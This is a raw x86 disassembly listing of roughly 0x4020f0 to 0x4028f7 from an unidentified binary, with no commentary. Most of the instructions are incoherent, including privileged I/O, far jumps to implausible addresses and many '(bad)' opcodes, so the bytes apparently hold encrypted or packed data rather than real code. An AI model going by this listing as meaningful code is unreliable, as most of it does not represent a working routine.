  4020f0:	adc    al,0xa6
  4020f2:	loop   0x4020bb
  4020f4:	dec    ecx
  4020f5:	sub    ebp,DWORD PTR [ecx-0x20590772]
  4020fb:	retf   0xde94
  4020fe:	dec    esi
  4020ff:	sti    
  402100:	rol    BYTE PTR [ebx],cl
  402102:	mov    ecx,0x3f0dfde0
  402107:	call   0xbb217482
  40210c:	stc    
  40210d:	adc    BYTE PTR [edx+0x23b9990],bl
  402113:	fstp   TBYTE PTR [ecx]
  402115:	sub    BYTE PTR [edi-0x7d],ch
  402118:	in     eax,0x1f
  40211a:	call   0x65d76755
  40211f:	jae    0x402130
  402121:	iret   
  402122:	push   ebx
  402123:	daa    
  402124:	aam    0xcb
  402126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402127:	xchg   edx,eax
  402128:	jno    0x4020af
  40212a:	mov    esi,DWORD PTR [esi-0x59]
  40212d:	pop    eax
  40212e:	and    ah,ah
  402130:	es loopne 0x40214f
  402133:	and    eax,esi
  402135:	jmp    0x4020d8
  402137:	sub    al,0x38
  402139:	jp     0x402164
  40213b:	mov    bh,0x73
  40213d:	stc    
  40213e:	push   es
  40213f:	adc    al,0xdf
  402141:	mov    esp,0x4580dd95
  402146:	dec    di
  402148:	in     al,dx
  402149:	or     dh,BYTE PTR [edi+0xe]
  40214c:	shl    BYTE PTR [ecx],1
  40214e:	mov    bh,0x99
  402150:	call   0x5281:0xb67ec30c
  402157:	xlat   BYTE PTR ds:[ebx]
  402158:	jecxz  0x402187
  40215a:	push   edx
  40215b:	adc    DWORD PTR [eax-0x1cc284aa],ebp
  402161:	xor    al,BYTE PTR [ebp-0x17ab1eb0]
  402167:	mov    ds:0x22a55e6d,eax
  40216c:	leave  
  40216d:	imul   eax,DWORD PTR [esi],0xffffff9a
  402170:	dec    ebx
  402171:	xchg   edi,eax
  402172:	jno    0x402113
  402174:	sbb    eax,0xcc6edcb7
  402179:	je     0x4021a4
  40217b:	cmp    ecx,DWORD PTR [eax+0x66ee6b93]
  402181:	jb     0x40211d
  402183:	cmp    al,0xbc
  402185:	in     eax,0x89
  402187:	adc    ch,bl
  402189:	in     al,0x13
  40218b:	add    DWORD PTR [edx+0x24a3bfe4],esi
  402191:	loop   0x40215b
  402193:	sub    eax,edi
  402195:	inc    ebp
  402196:	cld    
  402197:	xor    BYTE PTR [ebp+0x158bf89c],al
  40219d:	leave  
  40219e:	inc    esp
  40219f:	inc    ebx
  4021a0:	add    BYTE PTR [ebx+0x70151912],cl
  4021a6:	daa    
  4021a7:	inc    ebx
  4021a8:	add    cl,ch
  4021aa:	mov    cl,0x3
  4021ac:	add    BYTE PTR [eax],al
  4021ae:	in     eax,0xd
  4021b0:	lock or al,0x68
  4021b3:	mov    DWORD PTR [ecx-0xf],esi
  4021b6:	push   ecx
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	int3   
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	imul   eax,DWORD PTR [esi],0x452ced7
  4021c0:	jo     0x402232
  4021c2:	xchg   edi,eax
  4021c3:	jge    0x402235
  4021c5:	jo     0x4021b0
  4021c7:	std    
  4021c8:	mov    edx,0xfed35240
  4021cd:	dec    DWORD PTR [eax]
  4021cf:	popf   
  4021d0:	ins    DWORD PTR es:[edi],dx
  4021d1:	jne    0x4021d3
  4021d3:	aad    0xc2
  4021d5:	jp     0x4021ee
  4021d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021d8:	rcr    ebp,0xfe
  4021db:	es xor eax,0x2c51f1
  4021e1:	fwait
  4021e2:	cmp    BYTE PTR [ebx+0x2c25d39f],ah
  4021e8:	jle    0x4021a0
  4021ea:	lock xchg BYTE PTR [eax-0x21258c90],cl
  4021f1:	fdivr  QWORD PTR ds:0x501eb278
  4021f7:	fs test al,0xb4
  4021fa:	hlt    
  4021fb:	das    
  4021fc:	adc    BYTE PTR [edi-0x62],bh
  4021ff:	fs sbb al,0x4b
  402202:	mov    ebx,0x802453ec
  402207:	push   cs
  402208:	cmp    ah,BYTE PTR [eax+edx*4]
  40220b:	mov    bh,ah
  40220d:	outs   dx,BYTE PTR ds:[esi]
  40220e:	and    al,0x9
  402210:	push   edi
  402211:	push   es
  402212:	outs   dx,BYTE PTR ds:[esi]
  402213:	dec    ebx
  402214:	(bad)  
  402215:	and    ebp,eax
  402217:	popa   
  402218:	lahf   
  402219:	icebp  
  40221a:	or     BYTE PTR [edx],bl
  40221c:	push   0x5c
  40221e:	xchg   esp,eax
  40221f:	mov    ch,BYTE PTR [esi+edx*4+0x4ac215c0]
  402226:	je     0x40222d
  402228:	push   ecx
  402229:	pop    es
  40222a:	dec    ecx
  40222b:	adc    ebp,DWORD PTR [ebx]
  40222d:	xchg   ebx,eax
  40222e:	cmp    BYTE PTR [ecx-0xd],ah
  402231:	les    ecx,FWORD PTR [eax+ebp*4]
  402234:	imul   eax,edx,0x2420a47d
  40223a:	or     dh,bl
  40223c:	sbb    DWORD PTR [esi],0xcf046f5a
  402242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402243:	jmp    0x1c23:0xf2de2f0b
  40224a:	jmp    0x8730:0x4a4ee3b6
  402251:	rcr    BYTE PTR [eax+edx*8-0x7506fe03],0xb9
  402259:	jmp    0xbaa4:0xa973438
  402260:	add    DWORD PTR [edx-0xd58c08b],esp
  402266:	cmp    eax,0x3cb22798
  40226b:	leave  
  40226c:	fs mov ah,0x3e
  40226f:	iret   
  402270:	xor    ecx,DWORD PTR [edx+0x75b2e5fa]
  402276:	stos   DWORD PTR es:[edi],eax
  402277:	je     0x4022a6
  402279:	test   DWORD PTR [edi],0x10379bf1
  40227f:	repz ja 0x4022fb
  402282:	sbb    ah,ah
  402284:	sbb    ah,bh
  402286:	gs inc eax
  402288:	jne    0x4022a4
  40228a:	xchg   edx,eax
  40228b:	mov    ebx,0x43dc1940
  402290:	aas    
  402291:	cmc    
  402292:	push   ds
  402293:	pop    edx
  402294:	jmp    0x1e93:0x6088da27
  40229b:	cld    
  40229c:	adc    bl,BYTE PTR [ebx+ecx*2+0x13]
  4022a0:	call   0xaabd04a9
  4022a5:	mov    ebp,0xb0087841
  4022aa:	sbb    bh,BYTE PTR [esi+0x588eebfa]
  4022b0:	mov    eax,0xcd777fcc
  4022b5:	sub    ebp,edi
  4022b7:	push   ss
  4022b8:	jp     0x4022c8
  4022ba:	adc    edx,ebx
  4022bc:	lds    ebx,FWORD PTR [ebx-0x33447597]
  4022c2:	test   eax,0x2cd65a2b
  4022c7:	mov    ah,0xbb
  4022c9:	adc    eax,0xd0fb111b
  4022ce:	dec    esp
  4022cf:	dec    eax
  4022d0:	pop    ebp
  4022d1:	jbe    0x40232a
  4022d3:	push   0x8e35ffe2
  4022d8:	inc    edx
  4022d9:	(bad)  
  4022da:	pop    edx
  4022db:	cmc    
  4022dc:	idiv   BYTE PTR [eax]
  4022de:	(bad)  
  4022df:	adc    eax,0x789955ed
  4022e4:	ficom  DWORD PTR [edx-0x3adafdde]
  4022ea:	xchg   ebx,eax
  4022eb:	je     0x402279
  4022ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022ee:	add    al,0x2
  4022f0:	jle    0x402286
  4022f2:	push   ss
  4022f3:	pop    eax
  4022f4:	jle    0x4022f1
  4022f6:	push   edi
  4022f7:	(bad)  
  4022f8:	adc    eax,0xe35cff67
  4022fd:	cld    
  4022fe:	mov    eax,ds:0x6e3c1502
  402303:	(bad)  
  402305:	mov    ?,ecx
  402307:	mov    ecx,0xe9f4bbc
  40230c:	pop    edx
  40230d:	out    0xe0,eax
  40230f:	in     al,0x79
  402311:	dec    edx
  402312:	das    
  402313:	xor    edx,DWORD PTR [ebx+0x7]
  402316:	or     eax,0xfc3c32e2
  40231b:	sub    DWORD PTR [eax],esp
  40231d:	adc    eax,0x2c6b4fde
  402322:	fmul   QWORD PTR [edi+eiz*2-0x2d]
  402326:	outs   dx,DWORD PTR ds:[esi]
  402327:	je     0x40232f
  402329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40232a:	call   0x106e:0xf8f4e943
  402331:	fs pop esi
  402333:	pop    ecx
  402334:	ror    DWORD PTR [ecx+0x70a51919],cl
  40233a:	jl     0x40236d
  40233c:	or     eax,0x7ddc91b5
  402341:	add    al,0x77
  402343:	(bad)  
  402344:	repnz enter 0x181a,0x68
  402349:	lds    eax,FWORD PTR [ebp+0x6d]
  40234c:	je     0x402347
  40234e:	out    dx,eax
  40234f:	rol    DWORD PTR [ecx-0x347907bd],1
  402355:	std    
  402356:	mov    ecx,0x217cade4
  40235b:	pop    esp
  40235c:	push   ecx
  40235d:	xchg   esi,eax
  40235e:	xor    al,0xd4
  402361:	dec    ebx
  402362:	sbb    BYTE PTR [edi],bh
  402364:	jmp    0xbdc967ff
  402369:	dec    edx
  40236a:	fistp  WORD PTR [esp+edx*2]
  40236d:	cmp    al,0xa7
  40236f:	sbb    DWORD PTR [ecx+0x21],edx
  402372:	jno    0x4023a6
  402374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402375:	xor    eax,0x756e9dc3
  40237a:	ja     0x40236d
  40237c:	scas   eax,DWORD PTR es:[edi]
  40237d:	in     eax,dx
  40237e:	xchg   ecx,eax
  40237f:	ins    BYTE PTR es:[edi],dx
  402380:	mov    WORD PTR [ebp+0x7cd61ba],?
  402386:	int    0xd9
  402388:	rcl    DWORD PTR [esi+0x8b671d3],cl
  40238e:	or     BYTE PTR [edx+0x23b9f6bc],ch
  402394:	test   DWORD PTR [ecx-0x795b82cb],edi
  40239a:	into   
  40239b:	mov    bh,0xff
  40239d:	dec    ebp
  40239e:	ins    DWORD PTR es:[edi],dx
  40239f:	adc    DWORD PTR [edi],ecx
  4023a1:	retf   0xe3ee
  4023a4:	mov    ebp,ss
  4023a6:	mov    ecx,0xeab33679
  4023ab:	mov    al,0x52
  4023ad:	loopne 0x402351
  4023af:	mov    eax,ds:0x28a4d270
  4023b4:	dec    ebp
  4023b5:	jmp    FWORD PTR [eax+eax*4]
  4023b8:	test   eax,0xb34ba57
  4023bd:	fcmovu st,st(7)
  4023bf:	jnp    0x402381
  4023c1:	push   es
  4023c2:	jo     0x40241a
  4023c4:	hlt    
  4023c5:	add    eax,0x5e573d9d
  4023ca:	fidivr WORD PTR [edx]
  4023cc:	cmp    BYTE PTR [esi+edi*4-0x3a3cc48a],dh
  4023d3:	or     eax,0xfd950135
  4023d8:	enter  0x5bdb,0x11
  4023dc:	sbb    eax,0x98334b16
  4023e1:	mov    eax,0xbc7e359c
  4023e6:	mov    WORD PTR [ecx+esi*2-0x10],es
  4023ea:	out    0xb0,al
  4023ec:	inc    esi
  4023ed:	push   es
  4023ee:	xor    eax,0x9d51367d
  4023f3:	jae    0x402463
  4023f5:	inc    esp
  4023f6:	imul   ebp,DWORD PTR [ebp+0x6d8265db],0x44ceba87
  402400:	inc    ebp
  402401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402402:	fbstp  TBYTE PTR [edi]
  402404:	mov    ds:0x8e27e56,eax
  402409:	fs xor al,0xbb
  40240c:	pop    ebp
  40240d:	jmp    0xbbd4df84
  402412:	inc    esp
  402413:	adc    ch,BYTE PTR [esi-0xc60fdcf]
  402419:	ja     0x402411
  40241b:	push   eax
  40241c:	dec    ebp
  40241d:	or     BYTE PTR [edi],dl
  40241f:	jae    0x40245d
  402421:	addr16 lahf 
  402423:	dec    esp
  402424:	ins    DWORD PTR es:[edi],dx
  402425:	sahf   
  402426:	xchg   BYTE PTR [edx],dl
  402428:	lahf   
  402429:	xor    ch,bh
  40242b:	push   0x23
  40242d:	mov    edx,DWORD PTR [ebx-0x1d]
  402430:	rcl    DWORD PTR [eax-0x65c506f2],cl
  402436:	sahf   
  402437:	pop    edi
  402438:	(bad)  
  402439:	push   ss
  40243a:	inc    edx
  40243b:	loope  0x40245d
  40243d:	xor    DWORD PTR [ebx],ecx
  40243f:	sar    DWORD PTR [esi+esi*8+0x6e],1
  402443:	add    DWORD PTR [esi],eax
  402445:	push   esi
  402446:	dec    ebx
  402447:	in     eax,dx
  402448:	mov    al,0x22
  40244a:	xor    DWORD PTR [eax+edx*8+0x76f65889],esp
  402451:	sti    
  402452:	cs inc edx
  402454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402455:	mov    bh,0xb9
  402457:	iret   
  402458:	jbe    0x40240b
  40245a:	retf   
  40245b:	mov    eax,0x9536af6b
  402460:	(bad)  
  402461:	mov    eax,0xd28dcc82
  402466:	pop    ecx
  402467:	jnp    0x402462
  402469:	jp     0x4024e9
  40246b:	fcmovnb st,st(0)
  40246d:	clc    
  40246e:	sbb    eax,0xfd838303
  402473:	inc    esi
  402474:	xchg   ebx,eax
  402475:	sub    DWORD PTR [ecx],0x2c7984c2
  40247b:	jmp    0x4024ef
  40247d:	and    dl,dl
  40247f:	cmp    eax,0xd6b27061
  402484:	aas    
  402485:	test   esp,ebp
  402487:	addr16 adc al,0xbd
  40248a:	lods   eax,DWORD PTR ds:[esi]
  40248b:	clc    
  40248c:	and    eax,DWORD PTR [eax]
  40248e:	cmp    BYTE PTR [edi-0x36],dl
  402491:	cld    
  402492:	mov    esp,0x4b4ae3da
  402497:	pop    eax
  402498:	cli    
  402499:	dec    ecx
  40249a:	jmp    0x4596:0xbabb61c4
  4024a1:	popw   ss
  4024a3:	out    0xe5,eax
  4024a5:	sbb    BYTE PTR [edi+edi*8+0x5f],ch
  4024a9:	and    eax,0x1848e3b9
  4024ae:	xchg   ebx,eax
  4024af:	mov    edi,ebp
  4024b1:	adc    DWORD PTR [eax+0x13],ecx
  4024b4:	mov    esi,0x7cfbc797
  4024b9:	daa    
  4024ba:	xchg   ecx,eax
  4024bb:	cwde   
  4024bc:	cld    
  4024bd:	(bad)  
  4024be:	out    dx,al
  4024bf:	mov    ds:0x99efe2f2,al
  4024c4:	ja     0x40252b
  4024c6:	fcomip st,st(0)
  4024c8:	sbb    esp,edx
  4024ca:	cwde   
  4024cb:	ds push es
  4024cd:	(bad)  
  4024ce:	bound  ebp,QWORD PTR ds:0xdd6be799
  4024d4:	paddsb mm4,QWORD PTR ds:0xd40a2fc0
  4024db:	(bad)  
  4024dc:	xchg   esi,eax
  4024dd:	call   0x805944e6
  4024e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024e3:	push   es
  4024e4:	icebp  
  4024e5:	sbb    al,ah
  4024e7:	bound  ebx,QWORD PTR [ecx+ecx*2+0x65]
  4024eb:	xchg   BYTE PTR [ecx+0x44],al
  4024ee:	loopne 0x402523
  4024f0:	sbb    edi,edi
  4024f2:	inc    edx
  4024f3:	jle    0x40250d
  4024f5:	es das 
  4024f7:	or     BYTE PTR [esi-0x42],dh
  4024fa:	xchg   ebx,eax
  4024fb:	loop   0x4024cd
  4024fd:	jp     0x4024ca
  4024ff:	sub    DWORD PTR [eax],edi
  402501:	mov    eax,0x7176c8b1
  402506:	lahf   
  402507:	mov    cl,BYTE PTR [esi+0x67]
  40250a:	add    ah,dl
  40250c:	call   0xbc47c364
  402511:	jl     0x402514
  402513:	sbb    DWORD PTR [ebx],0xc82a2b3f
  402519:	dec    ecx
  40251a:	mov    bh,0x58
  40251c:	std    
  40251d:	add    dl,ah
  40251f:	inc    ebx
  402520:	addr16 push 0x5d53fcf7
  402526:	stos   DWORD PTR es:[edi],eax
  402527:	out    dx,eax
  402528:	dec    esp
  402529:	ins    BYTE PTR es:[edi],dx
  40252a:	and    edx,esi
  40252c:	push   ebp
  40252d:	push   ss
  40252e:	mov    ds:0xf7750213,eax
  402533:	pop    ebx
  402534:	add    eax,eax
  402536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402537:	test   BYTE PTR [edi],al
  402539:	ss aaa 
  40253b:	and    edx,ecx
  40253d:	pop    ecx
  40253e:	test   bh,al
  402540:	xor    cl,BYTE PTR [esi+0x54]
  402543:	fisub  DWORD PTR [ebx]
  402545:	mov    ebp,0xae53032b
  40254a:	out    0xd5,al
  40254c:	dec    edi
  40254d:	es leave 
  40254f:	fnstenv [edx+ebp*4-0x29eeef00]
  402556:	loop   0x402546
  402558:	xchg   BYTE PTR [ebx],bl
  40255a:	pushf  
  40255b:	pop    ebp
  40255c:	add    DWORD PTR [ebx-0x55],0xffffff8b
  402560:	push   ebp
  402561:	clc    
  402562:	sub    ecx,0x6fb0
  402568:	push   esi
  402569:	add    DWORD PTR ds:0x432770,ecx
  40256f:	mov    ecx,0x7510855
  402574:	xor    edx,ecx
  402576:	and    esi,0x4f5d
  40257c:	mov    esi,0x32729c
  402581:	push   edi
  402582:	mov    edi,DWORD PTR [ebp+0x10]
  402585:	add    DWORD PTR ds:0x432e52,0x432770
  40258f:	add    edx,esi
  402591:	jmp    0x402947
  402596:	mov    ah,0x31
  402598:	cdq    
  402599:	or     ebx,DWORD PTR [ecx+0x8b1b293]
  40259f:	or     dl,BYTE PTR [ebp+0x24]
  4025a2:	data16 daa 
  4025a4:	push   0x7c
  4025a6:	jmp    0x97b095ab
  4025ab:	jge    0x40261d
  4025ad:	jo     0x402605
  4025af:	test   BYTE PTR [ebx+0x7a],ah
  4025b2:	fld    st(5)
  4025b4:	call   0xce9bb0c5
  4025b9:	adc    DWORD PTR [edx],ebx
  4025bb:	inc    DWORD PTR [ebp-0x21]
  4025be:	loope  0x402639
  4025c0:	addr16 push esp
  4025c2:	add    eax,0x4595f382
  4025c7:	dec    esi
  4025c8:	xchg   edx,eax
  4025c9:	dec    esp
  4025ca:	inc    ebp
  4025cb:	aad    0x2e
  4025cd:	or     eax,0x4812e59b
  4025d2:	push   0xffffffbf
  4025d4:	or     ch,BYTE PTR [esi]
  4025d6:	xor    BYTE PTR [esi+0x1159b6a2],bl
  4025dc:	aam    0x1c
  4025de:	retf   
  4025df:	sbb    edx,0xffffffb8
  4025e2:	fild   WORD PTR [edx+0x1a]
  4025e5:	int3   
  4025e6:	mov    WORD PTR [ebp-0x14],cs
  4025e9:	dec    eax
  4025ea:	cwde   
  4025eb:	lods   eax,DWORD PTR ds:[esi]
  4025ec:	mov    bh,0xe7
  4025ee:	add    ebx,DWORD PTR [eax+edx*1+0x13431eef]
  4025f5:	mov    edx,0x26339659
  4025fa:	mov    bh,0x81
  4025fc:	xchg   esp,eax
  4025fd:	pop    ss
  4025fe:	inc    ecx
  4025ff:	pop    edi
  402600:	xor    al,al
  402602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402603:	outs   dx,BYTE PTR ds:[esi]
  402604:	sbb    BYTE PTR [edi],0xe5
  402607:	lea    ebx,[ecx-0x2126f95f]
  40260d:	cmp    dl,BYTE PTR [ecx+ecx*8]
  402610:	or     bh,BYTE PTR [esi+ebx*4-0x7b]
  402614:	inc    eax
  402615:	xor    al,0xe9
  402617:	jb     0x40262c
  402619:	mov    dh,0xfe
  40261b:	cmc    
  40261c:	dec    eax
  40261d:	repz inc ebx
  40261f:	mov    eax,ds:0x78f5f249
  402624:	bnd je 0x40264a
  402627:	into   
  402628:	outs   dx,BYTE PTR ds:[esi]
  402629:	sbb    ebx,edi
  40262b:	jae    0x402690
  40262d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40262e:	and    DWORD PTR [edx+0x1e],ebx
  402631:	push   eax
  402632:	repz aad 0xd
  402635:	cwde   
  402636:	(bad)  
  402637:	loop   0x402685
  402639:	retf   0xacaf
  40263c:	fisub  DWORD PTR [edi+0x4521536d]
  402642:	adc    al,0xa2
  402644:	sbb    ah,dh
  402646:	cdq    
  402647:	imul   edi,eax,0x1437f526
  40264d:	cmp    eax,0x1fc95068
  402652:	push   ebp
  402653:	mov    dh,BYTE PTR [edi-0x4effbefb]
  402659:	xor    dl,BYTE PTR [ebp-0x306a107f]
  40265f:	adc    ebx,DWORD PTR [edi]
  402661:	loope  0x4026d0
  402663:	aas    
  402664:	int    0x50
  402666:	jp     0x40267b
  402668:	aaa    
  402669:	cmp    BYTE PTR [edx+0x4d],bh
  40266c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40266d:	ret    
  40266e:	scas   al,BYTE PTR es:[edi]
  40266f:	or     esi,esp
  402671:	inc    ecx
  402672:	xchg   ebp,eax
  402673:	(bad)  
  402674:	cmp    ebx,DWORD PTR [eax]
  402676:	imul   ebx,DWORD PTR [ebx],0xffffff99
  402679:	adc    bh,BYTE PTR [eax-0x51]
  40267c:	in     eax,0x18
  40267e:	xchg   esp,eax
  40267f:	bound  edi,QWORD PTR [esi+0x31700b]
  402685:	outs   dx,BYTE PTR ds:[esi]
  402686:	cmp    eax,DWORD PTR [edx+edi*1-0x10ecc0ff]
  40268d:	cmp    eax,0x5e115600
  402692:	das    
  402693:	(bad)  
  402694:	xor    eax,0xfcd02554
  402699:	mov    DWORD PTR [eax],ebp
  40269b:	mov    DWORD PTR [edi+0x58],edi
  40269e:	push   edx
  40269f:	test   eax,0xe24cb1b0
  4026a4:	cmp    al,0x90
  4026a6:	adc    DWORD PTR [edi-0x3b56168b],ebx
  4026ac:	in     al,0xbd
  4026ae:	sub    eax,0x83da3941
  4026b3:	xor    DWORD PTR [eax+0x7d],0x3fb5995e
  4026ba:	pusha  
  4026bb:	outs   dx,BYTE PTR ds:[esi]
  4026bc:	add    esp,esi
  4026be:	and    ecx,DWORD PTR [edx+0x42]
  4026c1:	xchg   edi,eax
  4026c2:	cs in  eax,dx
  4026c4:	loop   0x4026a6
  4026c6:	shr    edi,0xd2
  4026c9:	push   es
  4026ca:	sbb    DWORD PTR [ecx-0x79],0x90c1cd35
  4026d1:	int    0x52
  4026d3:	js     0x4026da
  4026d5:	aas    
  4026d6:	sbb    eax,0xa4646ec
  4026db:	pop    esi
  4026dc:	dec    edi
  4026dd:	loop   0x402671
  4026df:	lahf   
  4026e0:	add    ebx,DWORD PTR gs:[esi]
  4026e3:	inc    ebx
  4026e4:	jno    0x402724
  4026e6:	sbb    eax,0x30d0abd4
  4026eb:	(bad)
  4026ee:	mov    BYTE PTR [eax],ch
  4026f0:	pop    edx
  4026f1:	mov    edi,DWORD PTR [edx+eiz*4]
  4026f4:	arpl   bp,ax
  4026f6:	mov    cl,0xba
  4026f8:	out    dx,al
  4026f9:	jno    0x4026e6
  4026fb:	jl     0x4026de
  4026fd:	push   eax
  4026fe:	xor    edx,DWORD PTR [ebp+0xf]
  402701:	xchg   edx,eax
  402702:	loop   0x402710
  402704:	xlat   BYTE PTR ds:[ebx]
  402705:	adc    eax,0x70a114f0
  40270a:	clc    
  40270b:	addr16 aas 
  40270d:	dec    esp
  40270e:	jecxz  0x402764
  402710:	jne    0x4026ec
  402712:	mov    al,ds:0xd7333db3
  402717:	add    bl,BYTE PTR [ebx]
  402719:	in     al,0x5e
  40271b:	jge    0x402718
  40271d:	retf   0x275a
  402720:	and    ebp,0x21
  402723:	xchg   esi,eax
  402724:	nop
  402725:	and    ch,BYTE PTR [edi+0x7647de9e]
  40272b:	push   es
  40272c:	jno    0x402751
  40272e:	mov    dl,0xda
  402730:	aaa    
  402731:	add    BYTE PTR [ebx-0x3950654f],dl
  402737:	call   0xd51466d2
  40273c:	dec    edi
  40273d:	das    
  40273e:	enter  0x7fa3,0xf
  402742:	shl    DWORD PTR [eax-0x3953bc91],1
  402748:	add    al,dl
  40274a:	pop    edi
  40274b:	retf   
  40274c:	xor    eax,0x6ee438b4
  402751:	cwde   
  402752:	fiadd  WORD PTR [esi-0x6b]
  402755:	xor    ecx,DWORD PTR [edi+0x76]
  402758:	push   edx
  402759:	jmp    0x61c42cbf
  40275e:	daa    
  40275f:	test   ebx,esp
  402761:	test   BYTE PTR [eax+0x43],ah
  402764:	repz mov ebp,0xc38d00d1
  40276a:	xchg   edi,eax
  40276b:	add    eax,0x9d4f68fb
  402770:	xchg   ebx,eax
  402771:	xchg   ecx,eax
  402772:	push   ecx
  402773:	ret    
  402774:	xchg   esi,eax
  402775:	push   ebx
  402776:	cmp    bl,BYTE PTR [ebp-0x61f8b92c]
  40277c:	in     eax,0x4e
  40277e:	inc    esi
  40277f:	ret    0x58f2
  402782:	scas   al,BYTE PTR es:[edi]
  402783:	push   esp
  402784:	inc    esp
  402785:	clc    
  402786:	out    dx,al
  402787:	aas    
  402788:	icebp  
  402789:	(bad)  
  40278b:	data16 icebp 
  40278d:	pop    eax
  40278e:	jmp    0x40275d
  402790:	aad    0x27
  402792:	les    ebp,FWORD PTR [esp+ecx*4]
  402795:	shl    DWORD PTR [ebp+0x55],1
  402798:	ret    
  402799:	das    
  40279a:	(bad)
  40279e:	push   es
  40279f:	mov    bl,0x0
  4027a1:	add    DWORD PTR [ebx+0x39a1a477],eax
  4027a7:	xchg   esp,eax
  4027a8:	aaa    
  4027a9:	fsubr  DWORD PTR [ebx-0x39]
  4027ac:	mov    edx,0xed9e2278
  4027b1:	mov    ch,0x20
  4027b3:	xor    eax,0x549dac83
  4027b8:	adc    esi,DWORD PTR [edi+0x11]
  4027bb:	lods   eax,DWORD PTR ds:[esi]
  4027bc:	and    ecx,ebx
  4027be:	div    DWORD PTR [ebp-0x3c]
  4027c1:	out    0x60,eax
  4027c3:	fistp  QWORD PTR [ecx+0x41602ece]
  4027c9:	jle    0x402766
  4027cb:	nop
  4027cc:	pusha  
  4027cd:	scas   eax,DWORD PTR es:[edi]
  4027ce:	jl     0x402750
  4027d0:	push   cs
  4027d1:	and    ah,ch
  4027d3:	neg    DWORD PTR [ebx-0x63]
  4027d6:	jb     0x402853
  4027d8:	fadd   DWORD PTR [ecx+0x74]
  4027db:	cli    
  4027dc:	mov    cl,0x8f
  4027de:	in     eax,0x70
  4027e0:	int3   
  4027e1:	popa   
  4027e2:	mov    bl,0xd7
  4027e4:	xor    DWORD PTR ds:0x1842e083,0xfffffffd
  4027eb:	loope  0x40283f
  4027ed:	mov    dl,0x2c
  4027ef:	adc    eax,0xf17ec39e
  4027f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027f5:	js     0x402814
  4027f7:	pop    es
  4027f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027f9:	sub    eax,0x23c4dd8a
  4027fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027ff:	in     al,dx
  402800:	or     esi,DWORD PTR [edi+0x1a]
  402803:	repnz cmp ebx,DWORD PTR [esi]
  402806:	mov    DWORD PTR [edx],ebp
  402808:	mov    ebp,0xf8621e85
  40280d:	ror    ebx,0x71
  402810:	add    eax,0x5aa2de8e
  402815:	jmp    0x1012bda4
  40281a:	sbb    eax,DWORD PTR [ecx]
  40281c:	out    0x8b,al
  40281e:	jmp    0x4027f3
  402820:	daa    
  402821:	(bad)  
  402822:	jle    0x402834
  402824:	fmul   st(2),st
  402826:	dec    edx
  402827:	test   eax,0x32c93095
  40282c:	stc    
  40282d:	arpl   WORD PTR [edx+0x4b9d1bea],cx
  402833:	sbb    ch,BYTE PTR [ebp-0x2b12bdfb]
  402839:	js     0x402845
  40283b:	pop    edi
  40283c:	cmp    eax,0x2ec479
  402841:	or     ebx,DWORD PTR [edx-0x2b]
  402844:	push   esp
  402845:	rcr    DWORD PTR [edx-0x5d80bc08],cl
  40284b:	shl    BYTE PTR [edx-0x2e],1
  40284e:	std    
  40284f:	gs mov ds,esi
  402852:	add    ebx,DWORD PTR [ebx+esi*2-0x14aca1e2]
  402859:	pop    eax
  40285a:	jno    0x402815
  40285c:	(bad)  
  40285d:	(bad)  
  40285e:	jb     0x402860
  402860:	mov    al,ds:0x99929230
  402865:	and    DWORD PTR [edi+edx*1-0x3ec1959f],esp
  40286c:	imul   edi,ebx,0xf7c4db1c
  402872:	cmc    
  402873:	xor    ecx,DWORD PTR [eax]
  402875:	mov    edx,0xf71f6046
  40287a:	ret    0x65b7
  40287d:	imul   esi,esi,0x652dfd76
  402883:	into   
  402884:	push   ss
  402885:	or     BYTE PTR [edi-0x77521864],cl
  40288b:	mov    edi,0x32ce11e5
  402890:	fmul   DWORD PTR [eax-0x36c17f32]
  402896:	xchg   DWORD PTR [eax-0x6dd2c82],esi
  40289c:	jmp    0x49fa:0xb1b5b3a3
  4028a3:	out    dx,al
  4028a4:	dec    ecx
  4028a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028a6:	adc    DWORD PTR [edi-0x5c],ebx
  4028a9:	sub    al,0x57
  4028ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028ac:	in     eax,dx
  4028ad:	mov    al,ds:0x1a05fdbf
  4028b2:	sub    eax,DWORD PTR [edi+0x43]
  4028b5:	cmp    BYTE PTR ds:0x948642eb,ah
  4028bb:	push   ebx
  4028bc:	cs std 
  4028be:	fprem1 
  4028c0:	in     al,0x36
  4028c2:	(bad)  
  4028c3:	jo     0x4028d3
  4028c5:	aas    
  4028c6:	test   BYTE PTR [edx],al
  4028c8:	pushf  
  4028c9:	xchg   ecx,eax
  4028ca:	ds xchg esi,eax
  4028cc:	or     al,0x60
  4028ce:	sub    cl,BYTE PTR [edx-0x7193f42e]
  4028d4:	outs   dx,BYTE PTR ds:[esi]
  4028d5:	push   ss
  4028d6:	push   esp
  4028d7:	push   DWORD PTR [edx]
  4028d9:	push   esp
  4028da:	mov    bl,0x4e
  4028dc:	and    ebp,ecx
  4028de:	out    dx,al
  4028df:	enter  0x91e9,0xdc
  4028e3:	mov    ebp,DWORD PTR [ebx+0x321fe94a]
  4028e9:	in     eax,0xfe
  4028eb:	inc    eax
  4028ec:	stc    
  4028ed:	fmul   DWORD PTR [ebx-0x70]
  4028f0:	jmp    0x8751:0x7f6836fa
  4028f7:	cmp    BYTE PTR [ebx-0x5a],dh
